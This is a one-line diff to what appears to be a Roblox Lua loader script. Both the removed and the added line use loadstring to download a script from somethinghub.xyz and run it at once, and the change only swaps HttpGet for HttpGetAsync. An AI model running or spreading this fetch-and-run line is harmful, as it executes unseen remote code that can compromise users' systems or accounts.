@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://somethinghub.xyz/script.lua"))()
+loadstring(game:HttpGetAsync("https://somethinghub.xyz/script.lua", true))()
